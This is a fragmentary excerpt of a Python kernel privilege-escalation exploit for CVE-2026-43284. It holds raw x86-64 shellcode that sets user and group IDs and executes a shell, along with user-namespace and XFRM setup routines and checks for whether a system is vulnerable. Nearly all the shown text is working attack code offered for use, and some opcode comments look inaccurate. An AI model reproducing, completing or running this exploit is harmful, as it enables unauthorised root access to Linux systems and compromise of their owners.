...
Fixed version with better error handling and user namespace detection
"""
...
SHELL_ELF = bytes([
    ...
    0xb0, 0x6a,                    # mov al, 0x6a (setuid)
    0x0f, 0x05,                    # syscall
    0xb0, 0x69,                    # mov al, 0x69 (setgid)
    0x0f, 0x05,                    # syscall
    0xb0, 0x74,                    # mov al, 0x74 (setresuid)
    0x0f, 0x05,                    # syscall
    0x6a, 0x00,                    # push 0
    0x48, 0x8d, 0x05, 0x12, 0x00, 0x00, 0x00,  # lea rax, [rip+0x12]
    0x50,                          # push rax
    0x48, 0x89, 0xe2,              # mov rdx, rsp
    0x48, 0x8d, 0x3d, 0x12, 0x00, 0x00, 0x00,  # lea rdi, [rip+0x12]
    0x31, 0xf6,                    # xor esi, esi
    0x6a, 0x3b,                    # push 0x3b (execve)
    0x58,                          # pop rax
    0x0f, 0x05,                    # syscall
    # Strings (16 bytes)
    0x54, 0x45, 0x52, 0x4d, 0x3d, 0x78, 0x74, 0x65,  # TERM=xte
    0x72, 0x6d, 0x00,              # rm\0
...
elif len(SHELL_ELF) > PAYLOAD_LEN:
    SHELL_ELF = SHELL_ELF[:PAYLOAD_LEN]

print(f"[*] Shellcode length: {len(SHELL_ELF)} bytes (expected {PAYLOAD_LEN})")
...
def write_proc(path, data):
    """Write to proc file with error handling"""
    try:
...
def setup_userns_netns():
    """Setup user namespace with better error handling"""
    real_uid = os.getuid()
    real_gid = os.getgid()
    ...
    try:
        ...
        print("[*] This system might not support user namespaces.")
        print("[*] Check: cat /proc/sys/kernel/unprivileged_userns_clone")
        raise
    
    # These writes might fail on some systems, but the exploit might still work
    write_proc("/proc/self/setgroups", "deny")
    write_proc("/proc/self/uid_map", f"0 {real_uid} 1\n")
    write_proc("/proc/self/gid_map", f"0 {real_gid} 1\n")
    
    # Try to bring up loopback interface
    ...
    try:
        ...
        print(f"[!] Warning: Could not configure loopback: {e}")
    finally:
        s.close()
...
def check_vulnerability():
    """Check if system might be vulnerable"""
    print("[*] Checking system vulnerabilities...")
    ...
    try:
        with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as f:
            ...
            if userns_enabled != 1:
                print("[!] Unprivileged user namespaces might be disabled")
            else:
                print("[+] Unprivileged user namespaces are enabled")
    except FileNotFoundError:
        print("[?] Could not determine user namespace status")
    
    # Check XFRM support
    try:
        with open("/proc/net/xfrm_stat", "r") as f:
            print("[+] XFRM appears to be supported")
    except FileNotFoundError:
        print("[!] XFRM might not be supported")
    
    # Check kernel version
    try:
        with open("/proc/version", "r") as f:
            version = f.read().strip()
            print(f"[*] Kernel: {version[:100]}...")
    except:
        pass
...
def main():
    ...
    parser.add_argument('--check', 
                        action='store_true',
                        help='Check if system might be vulnerable')
    ...
    if cpid == 0:
        try:
            ...
            print("[*] This system might not be vulnerable to CVE-2026-43284")
            os._exit(2)
        finally:
            os.close(target_fd)
